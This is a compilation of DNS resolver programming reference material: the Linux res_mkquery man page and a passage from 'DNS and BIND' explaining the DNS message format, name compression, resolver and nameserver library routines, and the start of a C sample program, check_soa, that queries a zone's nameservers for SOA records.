int res_send(const u_char *msg, int msglen, u_char *answer,
      int anslen);


Where

    The function returns the length of the reply message, or −1 if there were errors.

    msg is a pointer to the buffer containing the query.

    msglen is the length of the query in bytes.

    answer is a pointer to a buffer that contains the answer.

    anslen is the length of the buffer allocated to contain the answer, and should be large enough to contain the maximum size of the expected response.

		10.5.2 res_mkquery(3) - Linux man page
Name
res_init, res_query, res_search, res_querydomain, res_mkquery, res_send, dn_comp, dn_expand - resolver routines
Synopsis

#include <netinet/in.h>#include <arpa/nameser.h>#include <resolv.h>extern struct
state _res;
int res_init(void);
int res_query(const char *dname, int class, int type,unsigned char *answer,
int anslen);
int res_search(const char *dname, int class, int type,unsigned char *answer,
int anslen);
int res_querydomain(const char *name, const char *domain,int class, int
type, unsigned char *answer,int anslen);
int res_mkquery(int op, const char *dname, int class,int type, char *data,
int datalen, struct rrec *newrr,char *buf, int buflen);
int res_send(const char *msg, int msglen, char *answer,int anslen);
int dn_comp(unsigned char *exp_dn, unsigned char *comp_dn,int length, unsigned
char **dnptrs, unsigned char **lastdnptr);
int dn_expand(unsigned char *msg, unsigned char *eomorig,unsigned char
*comp_dn, char *exp_dn,int length);

Link with -lresolv.
Description
These functions make queries to and interpret the responses from Internet domain name servers.

The res_init() function reads the configuration files (see resolv.conf(5)) to get the default domain name, search order and name server address(es). If no server is given, the local host is tried. If no domain is given, that associated with the local host is used. It can be overridden with the environment variable LOCALDOMAIN. res_init() is normally executed by the first call to one of the other functions.

The res_query() function queries the name server for the fully qualified domain name name of specified type and class. The reply is left in the buffer answer of length anslen supplied by the caller.

The res_search() function makes a query and waits for the response like res_query(), but in addition implements the default and search rules controlled by RES_DEFNAMES and RES_DNSRCH (see description of _res options below).

The res_querydomain() function makes a query using res_query() on the concatenation of name and domain.

The following functions are lower-level routines used by res_query().

The res_mkquery() function constructs a query message in buf of length buflen for the domain name dname. The query type op is usually QUERY, but can be any of the types defined in <arpa/nameser.h>. newrr is currently unused.

The res_send() function sends a preformatted query given in msg of length msglen and returns the answer in answer which is of length anslen. It will call res_init(), if it has not already been called.

The dn_comp() function compresses the domain name exp_dn and stores it in the buffer comp_dn of length length. The compression uses an array of pointers dnptrs to previously compressed names in the current message. The first pointer points to the beginning of the message and the list ends with NULL. The limit of the array is specified by lastdnptr. If dnptr is NULL, domain names are not compressed. If lastdnptr is NULL, the list of labels is not updated.

The dn_expand() function expands the compressed domain name comp_dn to a full domain name, which is placed in the buffer exp_dn of size length. The compressed name is contained in a query or reply message, and msg points to the beginning of the message.

The resolver routines use global configuration and state information contained in the structure _res, which is defined in <resolv.h>. The only field that is normally manipulated by the user is _res.options. This field can contain the bitwise "OR" of the following options:

RES_INIT
    True if res_init() has been called. 
RES_DEBUG
    Print debugging messages. This option is only available if glibc was built with debugging enabled, which is not the default. 
RES_AAONLY
    Accept authoritative answers only. res_send() continues until it finds an authoritative answer or returns an error. [Not currently implemented]. 
RES_USEVC
    Use TCP connections for queries rather than UDP datagrams. 
RES_PRIMARY
    Query primary domain name server only. 
RES_IGNTC
    Ignore truncation errors. Don't retry with TCP. [Not currently implemented]. 
RES_RECURSE
    Set the recursion desired bit in queries. Recursion is carried out by the domain name server, not by res_send(). [Enabled by default]. 
RES_DEFNAMES
    If set, res_search() will append the default domain name to single component names, i.e., those that do not contain a dot. [Enabled by default]. 
RES_STAYOPEN
    Used with RES_USEVC to keep the TCP connection open between queries. 
RES_DNSRCH
    If set, res_search() will search for hostnames in the current domain and in parent domains. This option is used by gethostbyname(3). [Enabled by default].

This list is not complete. You can find some other flags described in resolv.conf(5).
Return Value
The res_init() function returns 0 on success, or -1 if an error occurs.

The res_query(), res_search(), res_querydomain(), res_mkquery() and res_send() functions return the length of the response, or -1 if an error occurs.

The dn_comp() and dn_expand() functions return the length of the compressed name, or -1 if an error occurs.
Files

/etc/resolv.conf          resolver configuration file
/etc/host.conf            resolver configuration file

Conforming to 4.3BSD.
See Also
gethostbyname(3), resolv.conf(5), resolver(5), hostname(7), named(8)
die.net

    site search Google Custom Search

Library
    linux docs
    linux man pages
    online dictionary
    page load time

Toys
    world sunlight
    moon phase
    trace explorer

Back

		10.5.3 C Programming with the Resolver Library Routines
DNS and BIND, Fifth Edition - Chapter 15. Programming with the Resolve... > C Programming with the Resolver Libr...
| 15.2. C Programming with the Resolver Library Routines

Before writing any code, though, you need to be familiar with the DNS message format and the resolver library routines. In the shell script we just wrote, nslookup parsed the DNS message. In a C program, though, you have to do the parsing. Let's start this section on programming by looking at the DNS message format.
| 15.2.1. DNS Message Format

You've seen the DNS message format before, in Chapter 12. It looks like this:

    Header section

    Question section

    Answer section

    Authority section

    Additional section

The format of the header section is described in RFC 1035 on pages 26–28, and in Appendix A of this book. It looks like this:

query identification number (2 octets)
query response (1 bit)
opcode (4 bits)
authoritative answer (1 bit)
truncation (1 bit)
recursion desired (1 bit)
recursion available (1 bit)
reserved (3 bits)
response code (4 bits)
question count (2 octets)
answer record count (2 octets)
name server record count (2 octets)
additional record count (2 octets)


You'll also find opcode, response code, type, and class values defined in arpa/nameser.h, as well as routines to extract this information from a message. We'll discuss these routines, part of the nameserver library, shortly.

The question section is described on pages 28–29 of RFC 1035. It looks like this:

domain name (variable length)
query type (2 octets)
query class (2 octets)


The answer, authority, and additional sections are described on pages 29–30 of RFC 1035. These sections comprise some number of resource records that look like this:

domain name (variable length)
type (2 octets)
class (2 octets)
TTL (4 octets)
resource data length (2 octets)
resource data (variable length)


The header section contains a count of how many of these resource records are in each section.
| 15.2.2. Domain Name Storage

As you can see, the names stored in the DNS message are of variable length. Unlike C, DNS does not store the names as null-terminated strings. Domain names are stored as a series of length/value pairs ending with an octet of 0. Each label in a domain name is composed of a length octet and a label. A name like venera.isi.edu is stored as:

6 venera  3  isi  3 edu 0


You can imagine how much of a DNS message could be devoted to storing names. The developers of DNS recognized this and came up with a simple way to compress domain names.
| 15.2.3. Domain Name Compression

Often, an entire domain name or, at least, the trailing labels of a domain name match a name already stored in the message. Domain name compression eliminates the repetition of domain names by storing a pointer to the earlier occurrence of the name instead of inserting the name again. Here is how it works. Suppose a response message already contains the name venera.isi.edu. If the name vaxa.isi.edu is added to the response, the label vaxa is stored, and then a pointer to the earlier occurrence of isi.edu is added. So how are these pointers implemented?

The first two bits of the length octet indicate whether a length/label pair or a pointer to a length/label pair follows. If the first two bits are zeros, then the length and label follow. As you may remember from way back in Chapter 2, a label is limited to 63 characters. That's because the length field has only the remaining six bits for the length of the label—enough to represent the lengths 0-63. If the first two bits of the length octet are ones, then what follows is not a length but a pointer. The pointer is the last 6 bits of the length octet and the next octet—14 bits in total. The pointer is an offset from the start of the DNS message. Now, when vaxa.isi.edu is compressed into a buffer containing only venera.isi.edu, this is what results:

 byte offset: 0 123456 7 890 1 234 5 6 7890 1    2
               -------------+--------------+--------
pkt contents: 6 venera 3 isi 3 edu 0 4 vaxa 0xC0 7


The 0xC0 is a byte with the high two bits ones and the rest of the bits zeros. Since the high two bits are ones, this is a pointer instead of a length. The pointer value is 7: the last six bits of the first octet are zeros and the second octet is 7. At offset seven in this buffer, you find the rest of the domain name that begins with vaxa, which is isi.edu.

In this example, we only showed the compression in two domain names in a buffer, not a whole DNS message. A DNS message would have had a header as well as other fields. This example is intended only to give you an idea of how the domain name compression works. Now the good news: you don't really need to care how names are compressed as long as the library routines do it properly. What you do need to know is how parsing a DNS response message can get messed up if you are off by one byte. For example, try to expand the name starting with byte two instead of byte one. You'll discover that "v" doesn't make a very good length octet or pointer.
| 15.2.4. The Resolver Library Routines

The resolver library contains the routines that you need to write your application. You'll use these routines to generate queries. You'll use the nameserver library routines, explained next, to parse the response.

In case you're wondering why we're not using the BIND 9 resolver routines in our code, BIND 9 includes library routines to perform lots of powerful DNS functions, but they're oriented toward the BIND 9 nameserver's needs and are very complicated to use, we're told. BIND 9 includes the BIND 8 resolver in lib/bind/resolv and we will continue to use that for now. A program linked against the BIND 8 library routines will work just fine with a BIND 9 nameserver.

Here are the header files you must include:

#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/nameser.h>
#include <resolv.h>


Now let's look at the resolver library routines.
| 15.2.4.1. herror and h_errno

extern int h_errno;
int herror(const char *s)


herror is a routine like perror, except that it prints out a string based on the value of the external variable h_errno instead of errno. The only argument is:


s

    A string used to identify the error message. If a string s is supplied, it is printed first, followed by ":" and a string based on the value of h_errno.

Here are the possible values of h_errno:


HOST_NOT_FOUND

    The domain name does not exist. The return code in the nameserver response was NXDOMAIN.

TRY_AGAIN

    Either the nameserver is not running, or the nameserver returned SERVFAIL.

NO_RECOVERY

    Either the domain name could not be compressed because it was an invalid domain name (e.g., a name missing a label—..movie.edu) or the nameserver returned FORMERR, NOTIMP, or REFUSED.

NO_DATA

    The domain name exists, but there is no data of the requested type.

NETDB_INTERNAL

    There was a library error unrelated to the network or name service. Instead, see errno for the problem description.

| 15.2.4.2. res_init

int res_init(void)


res_init reads resolv.conf and initializes a data structure called _res (more about that later). All the previously discussed routines will call res_init if they detect that it hasn't been called previously. Or you can call it on your own; this is useful if you want to change some of the defaults before calling the first resolver library routine. If there are any lines in resolv.conf that res_init doesn't understand, it ignores them. res_init always returns 0, even if the manpage reserves the right to return -1.
| 15.2.4.3. res_mkquery

int res_mkquery(int op,
                const char *dname,
                int class,
                int type,
                const u_char *data,
                int datalen,
                const u_char *newrr,
                u_char *buf,
                int buflen)


res_mkquery creates the query message. It fills in all the header fields, compresses the domain name into the question section, and fills in the other question fields.

The dname, class, and type arguments are the same as for res_search and res_query. The remaining arguments are:


op

    The "operation" to be performed. This is normally QUERY, but it can be IQUERY (inverse query). However, as we've explained before, IQUERY is seldom used. BIND versions 4.9.4 and later, by default, do not even support IQUERY.

data

    A buffer containing the data for inverse queries. It is NULL when op is QUERY.

datalen

    The size of the data buffer. If data is NULL, then datalen is 0.

newrr

    A buffer used for the dynamic update code (covered in Chapter 10). Unless you are playing with this feature, it is always NULL.

buf

    A buffer in which res_mkquery places the query message. It should be PACKETSZ or larger, like the answer buffer in res_search and res_query.

buflen

    The size of the buf buffer (e.g., PACKETSZ).

res_mkquery returns the size of the query message or -1 if there was an error.
| 15.2.4.4. res_query

int res_query(const char *dname,
              int class,
              int type,
              u_char *answer,
              int anslen)


res_query is one of the "mid-level" resolver routines. It does all the real work in looking up the domain name: it makes a query message by calling res_mkquery, sends the query by calling res_send, and looks at enough of the response to determine whether your question was answered. In many cases, res_query is called by res_search, which just feeds it the different domain names to look up. As you'd expect, these two functions have the same arguments. res_query returns the size of the response, or it fills in h_errno and returns -1 if there was an error or the answer count was 0.
| 15.2.4.5. res_search

int res_search(const char *dname,
               int class,
               int type,
               u_char *answer,
               int anslen)


res_search is the "highest level" resolver routine, and is called by gethostbyname. res_search applies the search algorithm to the domain name passed to it. That is, it takes the domain name it receives (dname), "completes" the name (if it's not fully qualified) by adding the various domain names from the resolver search list, and calls res_query until it receives a successful response, indicating that it found a valid, fully qualified domain name. In addition to implementing the search algorithm, res_search looks in the file referenced by your HOSTALIASES environment variable. (The HOSTALIASES variable was described in Chapter 6.) So it also takes care of any "private" host aliases you might have. res_search returns the size of the response or fills in h_errno and returns -1 if there was an error or the answer count is 0. (h_errno is like errno, but for DNS lookups.)

Therefore, the only parameter that's really of interest to res_search is dname; the others are just passed through to res_query and the other resolver routines. The other arguments are:


class

    The class of the data you're looking up. This is almost always the constant C_IN, the Internet class. The class constants are defined in arpa/nameser.h.

type

    The type of data you're looking up. Again, this is a constant defined in arpa/ nameser.h. A typical value would be T_NS to retrieve a nameserver record, or T_MX to retrieve an MX record.

answer

    A buffer in which res_search will place the response message. Its size should be at least PACKETSZ (from arpa/nameser.h) bytes.

anslen

    The size of the answer buffer (e.g., PACKETSZ).

res_search returns the size of the response or -1 if there was an error.
| 15.2.4.6. res_send

int res_send(const u_char *msg,
             int msglen,
             u_char *answer,
             int anslen)


res_send implements the retry algorithm. It sends the query message, msg, in a UDP datagram, but it can also send it over a TCP stream. The response message is stored in answer. This routine, of all the resolver routines, is the only one to use black magic (unless you know all about connected datagram sockets). You've seen these arguments before in the other resolver routines:


msg

    The buffer containing the DNS query message

msglen

    The size of the message

answer

    The buffer in which to store the DNS response message

anslen

    The size of the answer message

res_send returns the size of the response or -1 if there was an error. If this routine returns -1 and errno is ECONNREFUSED, then there is no nameserver running on the target nameserver host.

You can look at errno to see if it is ECONNREFUSED after calling res_search or res_query. (res_search calls res_query, which calls res_send.) If you want to check errno after calling res_query, clear errno first. That way, you know the current call to res_send was the one that set errno. However, you don't have to clear errno before calling res_search. res_search clears errno itself before calling res_query.
| 15.2.5. The _res Structure

Each resolver routine (i.e., each routine whose name starts with res_) uses a common data structure called _res. You can change the behavior of the resolver routines by changing _res. If you want to change the number of times res_send retries a query, you can change the value of the retry field. If you want to turn off the resolver search algorithm, you turn off the RES_DNSRCH bit from the options mask. You'll find the all-important _res structure in resolv.h:

struct _  _res_state {
    int      retrans;   /* retransmission time interval */
    int      retry;     /* number of times to retransmit */
    u_long   options;   /* option flags - see below. */
    int      nscount;   /* number of name servers */
    struct sockaddr_in
             nsaddr_list[MAXNS];   /* address of name server */
#define nsaddr nsaddr_list[0]      /* for backward compatibility */
    u_short id;                    /* current packet id */
    char     *dnsrch[MAXDNSRCH+1]; /* components of domain to search */
    char     defdname[MAXDNAME];   /* default domain */
    u_long   pfcode;               /* RES_PRF_ flags - see below. */
    unsigned ndots:4;              /* threshold for initial abs. query */
    unsigned nsort:4;              /* number of elements in sort_list[] */
    char     unused[3];
    struct {
           struct in_addr  addr;   /* address to sort on */
           u_int32_t       mask;
    } sort_list[MAXRESOLVSORT];
};


The options field is a simple bit mask of the enabled options. To turn on a feature, turn on the corresponding bit in the options field. Bit masks for each of the options are defined in resolv.h; the options are:


RES_INIT

    If this bit is on, res_init has been called.

RES_DEBUG

    This bit causes resolver debugging messages to be printed—if the resolver routines were compiled with DEBUG, that is. Off is the default.

RES_AAONLY

    Requires the answer to be authoritative, not from a nameserver's cache. It's too bad this isn't implemented, as it would be a useful feature. Given the BIND resolver's design, this feature would have to be implemented in the nameserver, and it's not.

RES_PRIMARY

    Query the primary master nameserver only—again, not implemented.

RES_USEVC

    Turn on this bit if you'd like the resolver to make its queries over a virtual circuit (TCP) connection instead of with UDP datagrams. As you might guess, there is a performance penalty for setting up and tearing down a TCP connection. Off is the default.

RES_STAYOPEN

    If you are making your queries over a TCP connection, turning on this bit causes the connection to be left open, so you can use it to query the same remote nameserver again. Otherwise, the connection is torn down after the query has been answered. Off is the default.

RES_IGNTC

    If the nameserver response has the truncation bit set, then the default resolver behavior is to retry the query using TCP. If this bit is turned on, the truncation bit in the response message is ignored, and the query is not retried using TCP. Off is the default.

RES_RECURSE

    The default behavior for the BIND resolver is to send recursive queries. Turning off this bit turns off the "recursion desired" bit in the query message. On is the default.

RES_DEFNAMES

    The default behavior for the BIND resolver is to append the local domain name to any domain name that does not have a dot in it. Turning off this bit turns off appending the local domain name. On is the default.

RES_DNSRCH

    The default behavior for the BIND resolver is to append each element of the search list to a domain name that does not end in a dot. Turning off this bit turns off the search list function. On is the default.

RES_INSECURE1

    The default behavior for a 4.9.3 or later BIND resolver is to ignore answers from nameservers that were not queried. Turning on this bit disables this security check. Off (i.e., security check on) is the default.

RES_INSECURE2

    The default behavior for a 4.9.3 or later BIND resolver is to ignore answers in which the question section of the response does not match the question section of the original query. Turning on this bit disables this security check. Off (i.e., security check on) is the default.

RES_NOALIASES

    The default behavior for the BIND resolver is to use aliases defined in the file specified by the user's HOSTALIASES environment variable. Turning on this bit disables the HOSTALIASES feature for 4.9.3 and later BIND resolvers. Previous resolvers did not allow this feature to be disabled. Off is the default.

RES_USE_INET6

    Tells the resolver to return IPv6 addresses (in addition to IPv4 addresses) to the gethostbyname function.

RES_ROTATE

    Normally, a resolver that sends repeated queries always queries the first nameserver in resolv.conf first. With RES_ROTATE set, a BIND 8.2 or later resolver sends its first query to the first nameserver in resolv.conf, its second to the second nameserver, and so on. (See the options rotate directive in Chapter 6 for details.) The default is not to rotate nameservers.

RES_NOCHECKNAME

    Since BIND 4.9.4, resolvers have checked the domain names in responses to make sure they conform to the naming guidelines described in Chapter 4. BIND 8.2 resolvers offer the option of turning off the name-checking mechanism. Off (i.e., name check on) is the default.

RES_KEEPTSIG

    This option tells a BIND 8.2 or later resolver not to strip the TSIG record from a signed DNS message. This way, the application that called the resolver can examine it.

RES_BLAST

    "Blast" all recursive servers by sending queries to them simultaneously. Not implemented yet.

RES_DEFAULT

    This isn't a single option, but rather a combination of the RES_RECURSE, RES_DEFNAMES, and RES_DNSRCH options, all of which are on by default. You normally won't need to set RES_DEFAULT explicitly; it's set for you when you call res_init.

| 15.2.6. The Nameserver Library Routines

The nameserver library contains routines you need to parse response messages. Here are the header files you must include:

#include <sys/types.h>
#include <netinet/in.h>
#include <netdb.h>
#include <arpa/nameser.h>
#include <resolv.h>


Following are the nameserver library routines.
| 15.2.6.1. ns_get16 and ns_put16

u_int ns_get16(const u_char *cp)
void  ns_put16(u_int s, u_char *cp)


The DNS messages have fields that are unsigned short integer (type, class, and data length, to name a few). ns_get16 returns a 16-bit integer pointed to by cp, and ns_put16 assigns the 16-bit value of s to the location pointed to by cp.
| 15.2.6.2. ns_get32 and ns_put32

u_long ns_get32(const u_char *cp)
void   ns_put32(u_long l, u_char *cp)


These routines are like their 16-bit counterparts except that they deal with a 32-bit integer instead of a 16-bit integer. The TTL (time to live) field of a resource record is a 32-bit integer.
| 15.2.6.3. ns_initparse

int ns_initparse(const u_char *msg,
                  int msglen,
                  ns_msg *handle)


ns_initparse is the first routine you must call before you use the other nameserver library routines. ns_initparse fills in the data structure pointed to by handle, which is a parameter passed to other routines. The arguments are:


msg

    A pointer to the beginning of the response message buffer

msglen

    The size of the message buffer

handle

    A pointer to a data structure filled in by ns_initparse

ns_initparse returns 0 on success and -1 if it fails to parse the message buffer.
| 15.2.6.4. ns_msg_base, ns_msg_end, and ns_msg_size

const u_char *ns_msg_base(ns_msg handle)
const u_char *ns_msg_end(ns_msg handle)
int ns_msg_size(ns_msg handle)


These routines return a pointer to the start of the message, a pointer to the end of the message, and the size of the message. They return the data you passed into ns_initparse. The only argument is:


handle

    A data structure filled in by ns_initparse

| 15.2.6.5. ns_msg_count

u_int16_t ns_msg_count(ns_msg handle, ns_sect section)


ns_msg_count returns a counter from the header section of the response message. Its arguments are:


handle

    A data structure filled in by ns_initparse

section

    An enumerated type that can have the following values:

    ns_s_qd  /* Query: Question section */
    ns_s_zn  /* Update: Zone section */
    ns_s_an  /* Query: Answer section */
    ns_s_pr  /* Update: Prerequisite section */
    ns_s_ns  /* Query: Name Server section */
    ns_s_ud  /* Update: Update section */
    ns_s_ar  /* Query|Update: Additional records section */


| 15.2.6.6. ns_msg_get_flag

u_int16_t ns_msg_get_flag(ns_msg handle, ns_flag flag)


ns_msg _ get_ flag returns the "flag" fields from the header section of the response message. Its arguments are:


handle

    A data structure filled in by ns_initparse

flag

    An enumerated type that can have the following values:

    ns_f_qr     /* Question/Response */
    ns_f_opcode /* Operation Code */
    ns_f_aa     /* Authoritative Answer */
    ns_f_tc     /* Truncation Occurred */
    ns_f_rd     /* Recursion Desired */
    ns_f_ra     /* Recursion Available */
    ns_f_z      /* Must Be Zero */
    ns_f_ad     /* Authentic Data (DNSSEC) */
    ns_f_cd     /* Checking Disabled (DNSSEC) */
    ns_f_rcode  /* Response Code */
    ns_f_max


| 15.2.6.7. ns_msg_id

u_int16_t ns_msg_id(ns_msg handle)


ns_msg _id returns the identification from the header section (described earlier) of the response message. The only argument is:


handle

    A data structure filled in by ns_initparse

| 15.2.6.8. ns_name_compress

int ns_name_compress(const char *exp_dn,
                     u_char *comp_dn,
                     size_t length,
                     const u_char **dnptrs,
                     const u_char **lastdnptr)


ns_name_compress compresses a domain name. You won't normally call this routine yourself—you'll let res_mkquery do it for you. However, if you need to compress a name for some reason, this is the tool to do it. The arguments are:


exp_dn

    The "expanded" domain name that you supply—i.e., a normal, null-terminated string containing a fully qualified domain name.

comp_dn

    The place where ns_name_compress will store the compressed domain name.

length

    The size of the comp_dn buffer.

dnptrs

    An array of pointers to previously compressed domain names. dnptrs[0] points to the beginning of the message; the list ends with a NULL pointer. After you've initialized dnptrs[0] to the beginning of the message and dnptrs[1] to NULL, dn_comp updates the list each time you call it.

lastdnptr

    A pointer to the end of the dnptrs array. ns_name_compress needs to know where the end of the array is so it doesn't overrun it.

If you want to use this routine, look at how it is used in the BIND source in src/lib/resolv/res_mkquery.c (BIND 8) or res/res_mkquery.c (BIND 4). It's often easier to see how to use a routine from an example than from an explanation. ns_name_compress returns the size of the compressed name or -1 if there was an error.
| 15.2.6.9. ns_name_skip

int ns_name_skip(const u_char **ptrptr, const u_char *eom)


ns_name_skip is like ns_name_uncompress, but instead of uncompressing the name, it just skips over it. The arguments are:


ptrptr

    A pointer to a pointer to the name to skip over. The original pointer is advanced past the name.

eom

    A pointer to the first byte after the message. It is used to make sure that ns_name_skip doesn't go past the end of the message.

ns_name_skip returns 0 if successful. It returns -1 if it fails to uncompress the name.
| 15.2.6.10. ns_name_uncompress

int ns_name_uncompress(const u_char *msg,
                       const u_char *eomorig,
                       const u_char *comp_dn,
                       char *exp_dn,
                       size_t length)


ns_name_uncompress expands a "compressed" domain name. You'll use this routine if you parse a nameserver response message, as we do in check_soa, the C program that follows. The arguments are:


msg

    A pointer to the beginning of your response message.

eomorig

    A pointer to the first byte after the message. It is used to make sure that ns_name_uncompress doesn't go past the end of the message.

comp_dn

    A pointer to the compressed domain name within the message.

exp_dn

    The place where ns_name_uncompress will store the expanded name. You should always allocate an array of MAXDNAME characters for the expanded name.

length

    The size of the exp_dn buffer.

ns_name_uncompress returns the size of the compressed name or -1 if there was an error. You might wonder why ns_name_uncompress returns the size of the compressed name, not the size of the expanded name. It does this because when you call ns_name_uncompress, you are parsing a DNS message and need to know how much space the compressed name occupied in the message so that you can skip over it.
| 15.2.6.11. ns_parserr

int ns_parserr(ns_msg *handle,
               ns_sect section,
               int rrnum,
               ns_rr *rr)


ns_parserr extracts information about a response record and stores it in rr, which is a parameter passed to other nameserver libarary routines. The arguments are:


handle

    A pointer to a data structure filled in by ns_initparse.

section

    The same parameter described in ns_msg _count.

rrnum

    A resource record number for the resource records in this section. Resource records start numbering at 0. ns_msg _count tells you how many resource records are in this section.

rr

    A pointer to a data structure to be initialized.

ns_parserr returns 0 on success and -1 if it fails to parse the response buffer.
| 15.2.6.12. ns_rr routines

char *ns_rr_name(ns_rr rr)
u_int16_t ns_rr_type(ns_rr rr)
u_int16_t ns_rr_class(ns_rr rr)
u_int32_t ns_rr_ttl(ns_rr rr)
u_int16_t ns_rr_rdlen(ns_rr rr)
const u_char *ns_rr_rdata(ns_rr rr)


These routines return individual fields from a response record. Their only argument is:


rr

    A data structure filled in by ns_parserr

| 15.2.7. Parsing DNS Responses

The easiest way to learn how to parse a DNS message is to look at code that already does it. Assuming that you have the BIND source code, the best file to look through is src/lib/resolv/res_debug.c (BIND 8) or lib/bind/resolv/res_debug.c (BIND 8 resolver in the BIND 9 distribution). (If you're really determined to use BIND 9, you might have to read almost 3,000 lines of lib/dns/message.c.) res_debug.c contains fp_query (or res_pquery in BIND 8.2 and later), the function that prints out the DNS messages in the nameserver debugging output. Our sample program traces its parentage to code from this file.

You won't always want to parse the DNS response manually. An intermediate way to parse the response is to call p_query, which calls fp_query, to print out the DNS message. Then use Perl or awk to grab what you need. Cricket has been known to wimp out in this way.
| 15.2.8. A Sample Program: check_soa

Let's now look at a C program to solve the same problem for which we wrote a shell script earlier.

Here are the header files that are needed, the declarations for external variables, and the declarations of functions. Notice that we use both h_errno (for the resolver routines) and errno. We limit this program to checking 20 nameservers. You'll rarely see a zone with more than 10 nameservers, so an upper limit of 20 should suffice.
Code View: Scroll / Show All

/****************************************************************
 * check_soa -- Retrieve the SOA record from each name server   *
 *     for a given zone and print out the serial number.        *
 *                                                              *
 * usage: check_soa zone                                        *
 *                                                              *
 * The following errors are reported:                           *
 *     o There is no address for a server.                      *
 *     o There is no server running on this host.               *
 *     o There was no response from a server.                   *
 *     o The server is not authoritative for the zone.          *
 *     o The response had an error response code.               *
 *     o The response had more than one answer.                 *
 *     o The response answer did not contain an SOA record.     *
 *     o The expansion of a compressed domain name failed.      *
 ****************************************************************/

/* Various header files */
#include <sys/types.h>
#include <netinet/in.h>
#include <netdb.h>
#include <stdio.h>
#include <errno.h>
#include <arpa/nameser.h>
#include <resolv.h>

/* Error variables */
extern int h_errno;  /* for resolver errors */
extern int errno;    /* general system errors */

/* Our own routines; code included later in this chapter */
void nsError(  );            /* report resolver errors */
void findNameServers(  );    /* find a zone's name servers */
void addNameServers(  );     /* add name servers to our list */
void queryNameServers(  );   /* grab SOA records from servers */
void returnCodeError(  );    /* report response message errors */

/* Maximum number of name servers we will check */
#define MAX_NS 20

					  


The main body of the program is small. We have an array of string pointers, nsList, to store the names of the nameservers for the zone. We call the resolver function res_init to initialize the _res structure. It wasn't necessary for this program to call res_init explicitly because it would have been called by the first resolver routine that used the _res structure. However, if we had wanted to modify the value of any of the _res fields before calling the first resolver routine, we would have made the modifications right after calling res_init. Next, the program calls findNameServers to find all the nameservers for the zone referenced in argv[1] and to store them in nsList. Last, the program calls queryNameServers to query each nameserver in nsList for the SOA record for the zone:
Code View: Scroll / Show All

main(argc, argv)
int argc;
char *argv[];
{
    char *nsList[MAX_NS];  /* list of name servers */
    int  nsNum = 0;        /* number of name servers in list */

    /* sanity check: one (and only one) argument? */
    if(argc != 2){
        (void) fprintf(stderr, "usage: %s zone\n", argv[0]);
        exit(1);
    }

    (void) res_init(  );

    /*
     * Find the name servers for the zone.
     * The name servers are written into nsList.
     */
    findNameServers(argv[1], nsList, &nsNum);

    /*
     * Query each name server for the zone's SOA record.
     * The name servers are read from nsList.
     */
    queryNameServers(argv[1], nsList, nsNum);

    exit(0);
}

					  


The routine findNameServers follows. This routine queries the local nameserver for the NS records for the zone. It then calls addNameServers to parse the response message and store away all the nameservers it finds. The header files, arpa/nameser.h and resolv.h, contain declarations we make extensive use of:
Code View: Scroll / Show All

/****************************************************************
 * findNameServers -- find all of the name servers for the      *
 *     given zone and store their names in nsList.  nsNum is    *
 *     the number of servers in the nsList array.               *
 ****************************************************************/
void
findNameServers(domain, nsList, nsNum)
char *domain;
char *nsList[];
int  *nsNum;
{
    union {
        HEADER hdr;              /* defined in resolv.h */
        u_char buf[NS_PACKETSZ]; /* defined in arpa/nameser.h */
    } response;                  /* response buffers */
    int responseLen;             /* buffer length */

    ns_msg handle;  /* handle for response message */

    /*
     * Look up the NS records for the given domain name.
     * We expect the domain name to be a fully qualified, so
     * we use res_query(  ).  If we'd wanted the resolver search
     * algorithm, we would have used res_search(  ) instead.
     */
    if((responseLen =
           res_query(domain,      /* the zone we care about   */
                     ns_c_in,     /* Internet class records     */
                     ns_t_ns,     /* Look up name server records*/
                     (u_char *)&response,      /*response buffer*/
                     sizeof(response)))        /*buffer size    */
                                        < 0){  /*If negative    */
        nsError(h_errno, domain); /* report the error           */
        exit(1);                  /* and quit                   */
    }

    /*
     * Initialize a handle to this response.  The handle will
     * be used later to extract information from the response.
     */
    if (ns_initparse(response.buf, responseLen, &handle) < 0) {
        fprintf(stderr, "ns_initparse: %s\n", strerror(errno));
        return;
    }

    /*
     * Create a list of name servers from the response.
     * NS records may be in the answer section and/or in the
     * authority section depending on the DNS implementation.
     * Walk through both.  The name server addresses may be in
     * the additional records section, but we will ignore them
     * since it is much easier to call gethostbyname(  ) later
     * than to parse and store the addresses here.
     */

    /*
     * Add the name servers from the answer section.
     */
    addNameServers(nsList, nsNum, handle, ns_s_an);

    /*
     * Add the name servers from the authority section.
     */
    addNameServers(nsList, nsNum, handle, ns_s_ns);
}

/****************************************************************
 * addNameServers -- Look at the resource records from a        *
 *     section.  Save the names of all name servers.            *
 ****************************************************************/

void
addNameServers(nsList, nsNum, handle, section)
char *nsList[];
int  *nsNum;
ns_msg handle;
ns_sect section;
{
    int rrnum;  /* resource record number */
    ns_rr rr;   /* expanded resource record */

    int i, dup; /* misc variables */

    /*
     * Look at all the resource records in this section.
     */
    for(rrnum = 0; rrnum < ns_msg_count(handle, section); rrnum++)
    {
        /*
         * Expand the resource record number rrnum into rr.
         */
        if (ns_parserr(&handle, section, rrnum, &rr)) {
            fprintf(stderr, "ns_parserr: %s\n", strerror(errno));
        }

        /*
         * If the record type is NS, save the name of the
         * name server.
         */
        if (ns_rr_type(rr) == ns_t_ns) {

            /*
             * Allocate storage for the name.  Like any good
             * programmer should, we test malloc's return value,
             * and quit if it fails.
             */
            nsList[*nsNum] = (char *) malloc (MAXDNAME);
            if(nsList[*nsNum] == NULL){
                (void) fprintf(stderr, "malloc failed\n");
                exit(1);
            }

            /* Expand the name server's domain name */
            if (ns_name_uncompress(
                        ns_msg_base(handle),/* Start of the message    */
                        ns_msg_end(handle), /* End of the message      */
                        ns_rr_rdata(rr),    /* Position in the message */
                        nsList[*nsNum],     /* Result                  */
                        MAXDNAME)           /* Size of nsList buffer   */
                                  < 0) {    /* Negative: error         */
                (void) fprintf(stderr, "ns_name_uncompress failed\n");
                exit(1);
            }

            /*
             * Check the domain name we've just unpacked and add it to
             * the list of name servers if it is not a duplicate.
             * If it is a duplicate, just ignore it.
             */
            for(i = 0, dup=0; (i < *nsNum) && !dup; i++)
                dup = !strcasecmp(nsList[i], nsList[*nsNum]);
            if(dup)
                free(nsList[*nsNum]);
            else
                (*nsNum)++;
        }
    }
}

					  


